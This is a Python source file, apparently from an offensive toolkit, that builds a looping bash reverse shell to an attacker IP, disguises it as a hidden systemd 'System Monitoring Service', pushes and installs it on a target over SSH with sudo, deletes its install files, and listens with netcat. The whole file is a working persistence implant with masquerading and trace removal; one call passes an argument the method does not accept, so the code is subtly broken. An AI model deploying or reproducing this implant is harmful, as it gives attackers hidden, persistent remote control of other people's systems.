import subprocess
from collections.abc import Callable
from ssh_connection import SSHConnection


class RSHConnection:
    def __init__(self, attacker_ip: str) -> None:
        self.attacker_ip: str = attacker_ip
        self.port: int = 10000
        self.hosts: dict[str, int] = {}
        self.ssh: SSHConnection = SSHConnection()

    def _is_port_available(self, port: int) -> bool:
        try:
            result = subprocess.run(
                ["nc", "-z", "-w", "1", "127.0.0.1", str(port)],
                capture_output=True,
                timeout=2,
            )
            return result.returncode != 0
        except Exception:
            return False

    def _get_available_port(self) -> int:
        while not self._is_port_available(self.port):
            self.port += 1
        return self.port

    def create_payload(self) -> tuple[str, int]:
        port = self._get_available_port()
        payload = f"""#!/bin/bash
while true; do
    bash -c 'bash -i >& /dev/tcp/{self.attacker_ip}/{port} 0>&1'
    sleep 60
done
"""
        return payload, port

    def create_service(self) -> str:
        service = """[Unit]
Description=System Monitoring Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/.sys_monitor
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
"""
        return service

    def deploy(self, target_ip: str) -> int:
        payload, port = self.create_payload(target_ip)
        service = self.create_service()

        remote_payload_path = "/tmp/.sys_monitor"
        remote_service_path = "/tmp/sys-monitor.service"

        with open("/tmp/.sys_monitor", "w") as f:
            f.write(payload)
        with open("/tmp/sys-monitor.service", "w") as f:
            f.write(service)

        self.ssh.connect(target_ip)
        self.ssh.scp("/tmp/.sys_monitor", remote_payload_path)
        self.ssh.scp("/tmp/sys-monitor.service", remote_service_path)

        install_script = f"""#!/bin/bash
cp {remote_payload_path} /usr/local/bin/.sys_monitor
chmod +x /usr/local/bin/.sys_monitor
cp {remote_service_path} /etc/systemd/system/sys-monitor.service
systemctl daemon-reload
systemctl enable sys-monitor
systemctl start sys-monitor
rm {remote_payload_path}
rm {remote_service_path}
rm /tmp/install.sh
"""

        with open("/tmp/install.sh", "w") as f:
            f.write(install_script)

        self.ssh.scp("/tmp/install.sh", "/tmp/install.sh")
        self.ssh.execute_quiet(f"sudo bash /tmp/install.sh")

        self.hosts[target_ip] = port
        return port

    def listen(self, port: int) -> None:
        print(f"Listening on port {port}... (Ctrl+C to stop)")
        subprocess.run(["nc", "-lvnp", str(port)])

    def cleanup(self, executor: Callable[[str, str], None], target_ip: str) -> None:
        if target_ip not in self.hosts:
            print(f"Host {target_ip} not in hosts")
            return

        cleanup_script = """#!/bin/bash
systemctl stop sys-monitor
systemctl disable sys-monitor
rm /etc/systemd/system/sys-monitor.service
rm /usr/local/bin/.sys_monitor
systemctl daemon-reload
rm /tmp/cleanup.sh
"""

        with open("/tmp/cleanup.sh", "w") as f:
            f.write(cleanup_script)

        self.ssh.connect(target_ip)
        self.ssh.scp("/tmp/cleanup.sh", "/tmp/cleanup.sh")
        self.ssh.execute_quiet(f"sudo bash /tmp/cleanup.sh")

        del self.hosts[target_ip]
        print(f"Cleaned up {target_ip}")
